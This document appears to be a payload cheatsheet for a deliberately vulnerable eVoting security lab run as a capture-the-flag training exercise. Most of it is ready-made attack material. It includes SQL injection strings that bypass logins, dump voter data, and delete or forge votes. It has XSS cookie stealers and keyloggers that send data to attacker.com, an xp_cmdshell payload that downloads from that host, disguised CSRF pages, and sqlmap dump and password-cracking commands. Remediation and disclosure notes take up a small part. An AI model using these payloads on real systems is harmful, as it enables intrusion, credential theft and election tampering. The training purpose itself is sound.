# eVoting Security Lab - Payload Cheatsheet 🔥

## 🎯 Quick Reference Guide for Ethical Hackers

---

## 🔍 SQL Injection Payloads

### Authentication Bypass
```sql
-- Classic OR bypass
admin' OR '1'='1
admin' OR '1'='1'--
admin' OR '1'='1'#
admin' OR 1=1--
admin'--
' OR 1=1--
' OR '1'='1
') OR ('1'='1
admin' OR 'x'='x
' OR 1=1#

-- Always true conditions
' OR 'a'='a
' OR 'foo'='foo'--
' OR 1=1 LIMIT 1--

-- Admin targeting
admin' AND 1=1--
admin' AND '1'='1'--
```

### Union-Based Injection
```sql
-- Determine column count
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
(continue until error)

-- Union select
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--

-- Extract data from person_info
admin' UNION SELECT CitizenNum,Username,Password,SSN,FirstName,LastName,1,2,3 FROM person_info--

-- Extract all users
' UNION SELECT GROUP_CONCAT(Username),GROUP_CONCAT(Password),1,2,3,4,5,6,7 FROM person_info--

-- Get table names
' UNION SELECT table_name,1,2,3,4,5,6,7,8 FROM information_schema.tables WHERE table_schema='evoting'--

-- Get column names
' UNION SELECT column_name,1,2,3,4,5,6,7,8 FROM information_schema.columns WHERE table_name='person_info'--
```

### Blind SQL Injection
```sql
-- Time-based
admin' AND (SELECT SLEEP(5))--
admin' AND IF(1=1, SLEEP(5), 0)--
admin' AND (SELECT * FROM (SELECT(SLEEP(5)))x)--

-- Boolean-based
admin' AND SUBSTRING((SELECT Password FROM person_info LIMIT 1),1,1)='a'--
admin' AND ASCII(SUBSTRING((SELECT Password FROM person_info LIMIT 1),1,1))>97--

-- Check if database exists
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='evoting')>0--

-- Check if table exists
' AND (SELECT COUNT(*) FROM ballot)>0--

-- Extract data character by character
' AND ASCII(SUBSTRING((SELECT Password FROM person_info WHERE Username='Admin187'),1,1))=112--
```

### Voting Manipulation
```sql
-- In president field
'; UPDATE ballot SET President_Selection='HACKED' WHERE 1=1--

-- Delete all votes
'; DELETE FROM ballot WHERE 1=1--

-- Delete specific party votes
'; DELETE FROM ballot WHERE Party_id=100--

-- Insert fake votes
'; INSERT INTO ballot VALUES (9999,50001,200,'2016',11,1,'FakeCandidate')--

-- In StateNum field
1' UNION SELECT Username,Password,SSN,1 FROM person_info--
```

### User Deletion Exploits
```sql
-- In CitizenNum field
1 OR 1=1  -- Deletes ALL users

-- Extract before delete
1 UNION SELECT Username,Password,SSN,1 FROM person_info--

-- Selective deletion
1 OR CitizenNum IN (SELECT CitizenNum FROM person_info WHERE Username LIKE 'admin%')

-- Drop table
1; DROP TABLE person_info--
```

---

## 🕷️ XSS Payloads

### Reflected XSS
```html
<!-- Basic alerts -->
<script>alert('XSS')</script>
<script>alert(1)</script>
<script>alert(document.cookie)</script>

<!-- Image-based -->
<img src=x onerror=alert('XSS')>
<img src=x onerror=alert(document.cookie)>
<img/src=x onerror=alert(1)>

<!-- SVG-based -->
<svg onload=alert('XSS')>
<svg/onload=alert(1)>

<!-- Body tag -->
<body onload=alert('XSS')>

<!-- Input field -->
"><script>alert('XSS')</script>
'><script>alert('XSS')</script>

<!-- Event handlers -->
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>

<!-- Link-based -->
<a href="javascript:alert('XSS')">Click</a>
```

### Stored XSS (for candidate descriptions)
```html
<!-- Basic stored XSS -->
<script>alert('Stored XSS')</script>

<!-- Cookie stealer -->
<script>
fetch('http://attacker.com/steal?cookie=' + document.cookie)
</script>

<!-- Keylogger -->
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/log?key=' + e.key);
}
</script>

<!-- Session hijacker -->
<script>
window.location='http://attacker.com/steal?session=' + document.cookie;
</script>

<!-- Image-based stealer -->
<img src=x onerror="this.src='http://attacker.com/steal?c='+document.cookie">
```

### DOM-Based XSS
```javascript
// In URL parameters
?candidate=<script>alert('XSS')</script>
?name=<img src=x onerror=alert(1)>

// Hash-based
#<script>alert('XSS')</script>

// JavaScript URL
javascript:alert('XSS')
```

---

## 🔐 Authentication Attacks

### Credential Stuffing
```
Common username/password combinations to try:
admin:admin
admin:password
administrator:password
root:root
admin:admin123
Admin187:password187  (known from source)
backdoor:secret123    (hidden backdoor)
```

### Session Hijacking
```javascript
// Steal session cookie
<script>document.write('<img src="http://attacker.com?cookie='+document.cookie+'">')</script>

// Session fixation
http://localhost:8181/evoting/login1.php?PHPSESSID=attacker_controlled_session
```

---

## 🛡️ CSRF Payloads

### Vote Manipulation CSRF
```html
<!DOCTYPE html>
<html>
<head><title>Free iPhone Giveaway!</title></head>
<body>
<h1>Congratulations! You won!</h1>
<form action="http://localhost:8181/evoting/electioninfo2016.php" method="POST" id="csrf">
    <input type="hidden" name="president" value="AttackerCandidate">
    <input type="hidden" name="VoterId" value="50001">
    <input type="hidden" name="StateNum" value="1">
    <input type="hidden" name="submit" value="Submit">
</form>
<script>document.getElementById('csrf').submit();</script>
<p>Processing your prize...</p>
</body>
</html>
```

### User Deletion CSRF
```html
<!DOCTYPE html>
<html>
<body>
<img src="http://localhost:8181/evoting/DeleteUser.php?CitizenNum=111111111&vID=50001&vName=victim&submit=1" style="display:none">
</body>
</html>
```

### Auto-submit CSRF
```html
<form action="http://target.com/action" method="POST" id="csrf">
    <input type="hidden" name="param" value="malicious">
</form>
<script>
window.onload = function() {
    document.getElementById('csrf').submit();
}
</script>
```

---

## 🔓 Access Control Bypasses

### Direct URL Access
```
Try accessing admin pages directly:
http://localhost:8181/evoting/AdminCode.php
http://localhost:8181/evoting/AdminCodeStuff.php
http://localhost:8181/evoting/DeleteUser.php
http://localhost:8181/evoting/AddNewCandidate.php
http://localhost:8181/evoting/Analytics.php
```

### Parameter Tampering
```
Change user IDs in URLs:
accountinfo.php?CitizenNum=111111111
(Change to another user's ID)

Change voter IDs in forms:
VoterId=50001
(Change to vote as someone else)
```

### Privilege Escalation
```
Look for role parameters:
?role=admin
?isAdmin=1
?privilege=administrator
```

---

## 🗄️ Database Extraction

### Direct MySQL Access
```bash
# Try these credentials found in source
mysql -h localhost -P 3306 -u root -proot_password evoting
mysql -h localhost -P 3306 -u evoting_user -pevoting123 evoting

# Common default credentials
mysql -h localhost -u root -p
(empty password)

mysql -h localhost -u root -proot
mysql -h localhost -u root -padmin
```

### Useful SQL Queries
```sql
-- Show all databases
SHOW DATABASES;

-- Show all tables
SHOW TABLES;

-- Dump all users
SELECT * FROM person_info;

-- Get passwords
SELECT Username, Password, SSN FROM person_info;

-- Get voting data
SELECT voter.V_name, ballot.President_Selection, ballot.Date_of_Vote 
FROM voter JOIN ballot ON voter.V_id = ballot.V_id;

-- Count votes by candidate
SELECT President_Selection, COUNT(*) as votes 
FROM ballot 
GROUP BY President_Selection;

-- Export to file
SELECT * FROM person_info INTO OUTFILE '/tmp/users.csv';
```

---

## 🔧 Tool Commands

### Burp Suite
```
1. Start Burp
2. Set browser proxy to 127.0.0.1:8080
3. Navigate to target site
4. Intercept requests
5. Modify parameters
6. Forward/Drop requests
```

### SQLMap
```bash
# Test login form
sqlmap -u "http://localhost:8181/evoting/login1.php" --forms --batch --risk=3 --level=5

# Dump database
sqlmap -u "http://localhost:8181/evoting/login1.php" --forms --dump-all

# Get tables
sqlmap -u "http://localhost:8181/evoting/login1.php" --forms --tables

# Get columns
sqlmap -u "http://localhost:8181/evoting/login1.php" --forms -T person_info --columns

# Extract data
sqlmap -u "http://localhost:8181/evoting/login1.php" --forms -T person_info -C Username,Password --dump
```

### OWASP ZAP
```bash
# Quick scan
zap-cli quick-scan http://localhost:8181/evoting/

# Spider the site
zap-cli spider http://localhost:8181/evoting/

# Active scan
zap-cli active-scan http://localhost:8181/evoting/

# Generate report
zap-cli report -o report.html -f html
```

### Nikto
```bash
# Basic scan
nikto -h http://localhost:8181/evoting/

# Detailed scan
nikto -h http://localhost:8181/evoting/ -Tuning 123456789

# Save results
nikto -h http://localhost:8181/evoting/ -o scan_results.html -Format html
```

### Nmap
```bash
# Service detection
nmap -sV localhost -p 8181,3306,8080

# Vulnerability scan
nmap --script=vuln localhost -p 8181

# MySQL specific scripts
nmap --script=mysql-enum,mysql-databases,mysql-users localhost -p 3306
```

### cURL
```bash
# GET request
curl -v http://localhost:8181/evoting/login1.php

# POST request
curl -X POST http://localhost:8181/evoting/login1.php \
  -d "Username=admin&Password=password&submit=login"

# SQL injection
curl -X POST http://localhost:8181/evoting/login1.php \
  -d "Username=admin' OR '1'='1&Password=anything&submit=login"

# Follow redirects
curl -L http://localhost:8181/evoting/login1.php

# Save cookies
curl -c cookies.txt http://localhost:8181/evoting/login1.php

# Use saved cookies
curl -b cookies.txt http://localhost:8181/evoting/home.php
```

---

## 🎯 Attack Scenarios

### Scenario 1: Complete System Takeover
```
1. Find hardcoded credentials (FLAG-AUTH-001)
2. Access admin panel (FLAG-BAC-001)
3. Add backdoor admin account
4. Extract all voter data (FLAG-DATA-001)
5. Manipulate election results
6. Cover tracks by deleting logs
```

### Scenario 2: Silent Vote Manipulation
```
1. SQL injection in login (FLAG-SQL-001)
2. Access database via PHPMyAdmin (FLAG-CONFIG-001)
3. Directly modify ballot table
4. Update vote counts
5. No visible traces in application
```

### Scenario 3: Mass Voter Fraud
```
1. Create CSRF payload (FLAG-CSRF-001)
2. Distribute malicious link
3. Victims unknowingly cast votes
4. Manipulate election outcome
5. Use XSS to spread further
```

---

## 📊 Flag Hunting Guide

### Easy Flags (100-150 points)
- FLAG-CONFIG-001: Check source code for credentials
- FLAG-AUTH-001: Try hardcoded logins
- FLAG-SQL-001: Basic SQL injection in login
- FLAG-BAC-001: Direct URL access to admin pages
- FLAG-XSS-001: Basic alert() in input fields

### Medium Flags (150-200 points)
- FLAG-SQL-003: Union-based data extraction
- FLAG-BAC-002: Multiple voting exploit
- FLAG-CSRF-001: Create working CSRF PoC
- FLAG-DATA-002: Password extraction

### Hard Flags (200-300 points)
- FLAG-SQL-005: Blind SQL injection
- FLAG-ADV-001: Second-order SQL injection
- FLAG-ADV-002: Timing-based blind SQLi
- FLAG-LOGIC-001: Race condition exploitation

### Expert Flags (300-500 points)
- SECRET-FLAG-001: Chain 3+ vulnerabilities
- SECRET-FLAG-002: Complete database dump
- SECRET-FLAG-003: Persistent backdoor installation

---

## 🛡️ Defense Recommendations

For each vulnerability, students should provide remediation:

### SQL Injection Prevention
```php
// VULNERABLE
$query = "SELECT * FROM users WHERE username='$user'";

// SECURE
$stmt = $mysqli->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $user);
$stmt->execute();
```

### XSS Prevention
```php
// VULNERABLE
echo "Welcome " . $_POST['name'];

// SECURE
echo "Welcome " . htmlspecialchars($_POST['name'], ENT_QUOTES, 'UTF-8');
```

### CSRF Prevention
```php
// Generate token
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));

// In form
<input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">

// Validate
if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die('CSRF token validation failed');
}
```

---

## 📝 Reporting Template

### Finding Structure
```markdown
## Vulnerability: [Name]

**Severity**: Critical/High/Medium/Low
**CWE**: [CWE Number]
**CVSS**: [Score]

### Description
[Detailed explanation]

### Proof of Concept
```
[Steps to reproduce with exact payloads]
```

### Evidence
[Screenshots, logs, output]

### Impact
- Confidentiality: High/Medium/Low
- Integrity: High/Medium/Low
- Availability: High/Medium/Low

### Remediation
[Specific code fixes and security measures]

### References
- OWASP: [Link]
- CWE: [Link]
```

---

## 🚀 Quick Start Commands

### Setup Environment
```bash
# Clone and start
git clone <repo-url> evoting-security-lab
cd evoting-security-lab
docker-compose up -d

# Verify services
docker-compose ps
docker-compose logs web

# Access application
firefox http://localhost:8181/evoting/login1.php &

# Start Burp Suite
burpsuite &
```

### Quick Wins
```bash
# 1. Find exposed credentials
curl http://localhost:8181/evoting/login1.php | grep -i "password\|admin\|username"

# 2. Check for directory listing
curl http://localhost:8181/evoting/

# 3. Test SQL injection
curl -X POST http://localhost:8181/evoting/login1.php \
  -d "Username=admin' OR '1'='1&Password=x&submit=login" -L

# 4. Access database
mysql -h localhost -P 3306 -u root -proot_password evoting -e "SHOW TABLES;"

# 5. Test XSS
curl "http://localhost:8181/evoting/login1.php?error=<script>alert(1)</script>"
```

---

## 🎓 Study Material

### OWASP Top 10 Mapping

**A01:2021 - Broken Access Control**
- FLAG-BAC-001, FLAG-BAC-002, FLAG-BAC-003, FLAG-BAC-004

**A02:2021 - Cryptographic Failures**
- FLAG-DATA-001, FLAG-DATA-002, FLAG-DATA-003

**A03:2021 - Injection**
- FLAG-SQL-001 through FLAG-SQL-011
- FLAG-ADV-001, FLAG-ADV-002

**A04:2021 - Insecure Design**
- FLAG-LOGIC-001 through FLAG-LOGIC-010

**A05:2021 - Security Misconfiguration**
- FLAG-CONFIG-001 through FLAG-CONFIG-011

**A06:2021 - Vulnerable Components**
- Deprecated MySQL functions
- Old PHP version

**A07:2021 - Authentication Failures**
- FLAG-AUTH-001 through FLAG-AUTH-004

**A08:2021 - Software and Data Integrity Failures**
- FLAG-CSRF-001, FLAG-CSRF-002, FLAG-CSRF-003

**A09:2021 - Security Logging Failures**
- FLAG-AUDIT-001

**A10:2021 - Server-Side Request Forgery**
- Check for SSRF in file operations

---

## 🔬 Advanced Techniques

### SQL Injection - Error-Based
```sql
-- Generate error to reveal info
' AND 1=CONVERT(int,(SELECT @@version))--
' AND 1=CONVERT(int,(SELECT user()))--

-- Extract using error
' AND 1=CONVERT(int,(SELECT Password FROM person_info LIMIT 1))--
```

### SQL Injection - Out-of-Band
```sql
-- DNS exfiltration (if DNS queries allowed)
'; EXEC xp_dirtree '\\'+@@version+'.attacker.com\share'--

-- HTTP exfiltration
'; EXEC master..xp_cmdshell 'certutil -urlcache -split -f http://attacker.com/x'--
```

### XSS - Advanced Payloads
```html
<!-- Bypass filters -->
<sCrIpT>alert(1)</sCrIpT>
<script>al\u0065rt(1)</script>
<script>eval(atob('YWxlcnQoMSk='))</script>

<!-- Polyglot -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

<!-- Cookie theft -->
<script>
new Image().src='http://attacker.com/steal?c='+btoa(document.cookie);
</script>

<!-- Keylogger -->
<script>
var keys='';
document.onkeypress=function(e){
  keys+=String.fromCharCode(e.which);
  if(keys.length>10){
    new Image().src='http://attacker.com/log?k='+keys;
    keys='';
  }
}
</script>
```

### Password Cracking
```bash
# Extract hashes from database
mysql -h localhost -u root -proot_password evoting \
  -e "SELECT Username, Password FROM person_info" > hashes.txt

# Crack with John the Ripper
john --format=raw-md5 hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Crack with Hashcat
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

### Automated Scanning
```bash
# Full automated scan
python3 evoting_exploiter.py http://localhost:8181

# Targeted SQLMap scan
sqlmap -u "http://localhost:8181/evoting/electioninfo2016.php" \
  --forms --batch --dump --threads=5

# Comprehensive ZAP scan
zap-cli quick-scan --self-contained --start-options '-config api.disablekey=true' \
  http://localhost:8181/evoting/
```

---

## 🎪 Competition Mode

### Capture the Flag Rules
1. Each flag is worth points based on difficulty
2. First to find gets bonus points
3. Must document exploitation method
4. Must provide remediation recommendation
5. Time-based scoring: Faster = More points

### Scoring Formula
```
Base Points + Time Bonus - Hints Used = Final Score

Base Points:
- Easy (100-150)
- Medium (150-200)  
- Hard (200-300)
- Expert (300-500)

Time Bonus:
- First 30 min: +50%
- 30-60 min: +25%
- 60-120 min: +10%
- 120+ min: +0%

Hint Penalty:
- Each hint: -25 points
```

### Leaderboard Categories
1. **Speed Demon**: Fastest to find all flags
2. **Completionist**: Found all flags + secret flags
3. **Documentarian**: Best vulnerability report
4. **Innovator**: Most creative exploitation method
5. **Defender**: Best remediation recommendations

---

## 🧪 Testing Checklist

### Pre-Test Setup
- [ ] Docker containers running
- [ ] Burp Suite configured
- [ ] Browser proxy set
- [ ] Testing tools installed
- [ ] Note-taking system ready
- [ ] Screenshot tool ready

### During Testing
- [ ] Document all requests
- [ ] Save all payloads
- [ ] Screenshot all findings
- [ ] Note all URLs tested
- [ ] Record all credentials found
- [ ] Map application structure

### Post-Test Documentation
- [ ] Organize findings by severity
- [ ] Create proof-of-concept code
- [ ] Write remediation recommendations
- [ ] Generate final report
- [ ] Submit all flags
- [ ] Clean up test data

---

## 🎯 Pro Tips

### Efficiency Hacks
1. **Use tab completion** in terminal
2. **Save common payloads** in Burp Suite
3. **Create bash aliases** for frequent commands
4. **Use browser bookmarks** for common URLs
5. **Script repetitive tasks** in Python
6. **Keep a payload library** organized by type

### Common Mistakes to Avoid
1. ❌ Not URL-encoding special characters
2. ❌ Forgetting to check response headers
3. ❌ Ignoring JavaScript files
4. ❌ Not testing edge cases
5. ❌ Skipping obvious vulnerabilities
6. ❌ Not documenting steps taken
7. ❌ Testing too quickly without understanding
8. ❌ Not reading error messages carefully

### Red Team Thinking
```
1. Reconnaissance → What can I see?
2. Enumeration → What can I access?
3. Exploitation → What can I break?
4. Privilege Escalation → What can I control?
5. Persistence → How can I maintain access?
6. Exfiltration → What data can I steal?
7. Cover Tracks → How do I hide my actions?
```

---

## 📱 Mobile Testing

### If testing mobile interface
```bash
# Set up mobile proxy
adb forward tcp:8080 tcp:8080

# Intercept HTTPS
adb push burp.cer /sdcard/
# Install certificate on device

# View mobile logs
adb logcat | grep -i "evoting"
```

---

## 🔐 Security Researcher Notes

### Responsible Disclosure
```
1. Test only authorized systems
2. Document all findings professionally
3. Report to system owner before public disclosure
4. Give reasonable time for fixes (90 days)
5. Coordinate disclosure timeline
6. Don't cause damage or data loss
7. Respect user privacy
```

### Legal Considerations
```
✅ DO:
- Test authorized systems only
- Use isolated lab environments
- Follow scope of engagement
- Respect data privacy
- Report findings responsibly

❌ DON'T:
- Test production systems without permission
- Exfiltrate real user data
- Cause service disruptions
- Share exploits publicly without disclosure
- Access systems beyond scope
```

---

## 🎬 Video Recording Tips

### For Documentation
```bash
# Record terminal session
asciinema rec evoting_test.cast

# Screen recording with sound
ffmpeg -f x11grab -s 1920x1080 -i :0.0 \
  -f alsa -i default -c:v libx264 -c:a aac \
  evoting_exploitation.mp4

# Take timed screenshots
while true; do 
  scrot -u 'screenshot_%Y-%m-%d_%H-%M-%S.png'
  sleep 60
done
```

---

## 🏆 Achievement Unlocks

### Badges to Earn
- 🥉 **First Blood**: Find your first flag
- 🥈 **SQL Ninja**: Find all SQL injection flags
- 🥇 **XSS Master**: Find all XSS flags
- 💎 **Access All Areas**: Bypass all access controls
- 🔓 **Lock Pick**: Crack all authentication
- 🎯 **Completionist**: Find all flags
- 👑 **Elite Hacker**: Find all secret flags
- 📝 **Professional**: Write complete report
- 🛡️ **Guardian**: Provide all remediations
- ⚡ **Speed Demon**: Complete in under 2 hours

---

## 📞 Support & Resources

### Getting Help
1. Review documentation first
2. Check hints in source code comments
3. Search OWASP resources
4. Review similar CTF writeups
5. Ask instructor (with penalty)

### Useful Links
- **OWASP Top 10**: https://owasp.org/www-project-top-ten/
- **PortSwigger Academy**: https://portswigger.net/web-security
- **HackTricks**: https://book.hacktricks.xyz/
- **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings
- **PentestMonkey**: http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet

---

## 🎓 Learning Path

### Beginner Track (Day 1-2)
1. Setup and reconnaissance
2. Basic SQL injection
3. Hardcoded credentials
4. Direct URL access
5. Simple XSS

### Intermediate Track (Day 3-4)
1. Union-based SQL injection
2. CSRF attacks
3. Session hijacking
4. Stored XSS
5. Parameter tampering

### Advanced Track (Day 5-6)
1. Blind SQL injection
2. Second-order injection
3. Authentication bypass chains
4. Logic flaw exploitation
5. Complete system compromise

### Expert Track (Day 7+)
1. Custom exploit development
2. Automated vulnerability discovery
3. Complex attack chains
4. Persistent backdoors
5. Professional reporting

---

**Happy Hunting! Remember: With great power comes great responsibility. 🚀🔒**
